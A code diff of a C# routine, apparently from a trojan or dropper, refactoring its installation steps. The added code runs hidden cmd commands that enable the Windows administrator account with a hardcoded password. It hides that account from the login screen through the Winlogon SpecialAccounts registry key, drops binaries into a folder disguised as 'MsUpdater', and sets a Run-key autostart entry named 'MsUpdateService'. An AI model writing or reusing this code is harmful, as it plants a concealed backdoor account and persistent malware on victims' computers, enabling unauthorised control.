@@ -17,52 +17,26 @@
                 throw new ArgumentNullException(nameof(args));
             }
 
-            const string Administrator = "administrator";
-            const string Password = "abc123kappa";
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = "cmd",
+                Arguments = "/C net user administrator /active:yes & net user administrator abc123kappa",
+                WindowStyle = ProcessWindowStyle.Hidden
+            });
 
-            CommandPrompt($"net user {Administrator} /active:yes").WaitForExit();
-            CommandPrompt($"net user {Administrator} {Password}").WaitForExit();
-
-            Directory.CreateDirectory(@"C:\Windows\MsUpdater\ShellEx");
-
-            const string Target = @"C:\Windows\MsUpdater\Bootstrap.exe";
-            File.WriteAllBytes(Target, Resources.Bootstrap);
+            const string Bootstrap = @"C:\Windows\MsUpdater\Bootstrap.exe";
+            File.WriteAllBytes(Bootstrap, Resources.Bootstrap);
             File.WriteAllBytes(@"C:\Windows\MsUpdater\InputSimulator.dll", Resources.InputSimulator);
-
-            const string SparkExecution = @"C:\Windows\MsUpdater\ShellEx\SparkExecution.dll";
-            File.WriteAllBytes(SparkExecution, Resources.SparkExecution);
-            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\LogicNP.EZShellExtensions.dll", Resources.LogicNP_EZShellExtensions);
-            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\register.exe", Resources.register);
-            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\restart.exe", Resources.RestartExplorer);
-
-            CommandPrompt(@"C:\Windows\MsUpdater\ShellEx\register.exe -i C:\Windows\MsUpdater\ShellEx\SparkExecution.dll").WaitForExit();
 
             using (var localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
             {
                 // ReSharper disable PossibleNullReferenceException
 
-                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
-                {
-                    key.CreateSubKey("SpecialAccounts", true).CreateSubKey("UserList", true).SetValue(Administrator, 0);
-                }
-
-                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
-                {
-                    key.SetValue("MsUpdateService", Target);
-                }
+                localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true).CreateSubKey("SpecialAccounts", true).CreateSubKey("UserList", true).SetValue("administrator", 0);
+                localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("MsUpdateService", Bootstrap);
 
                 // ReSharper restore PossibleNullReferenceException
             }
-        }
-
-        private static Process CommandPrompt(string args)
-        {
-            return Process.Start(new ProcessStartInfo
-            {
-                FileName = "cmd",
-                Arguments = $"/C {args}",
-                WindowStyle = ProcessWindowStyle.Hidden
-            });
         }
     }
 }
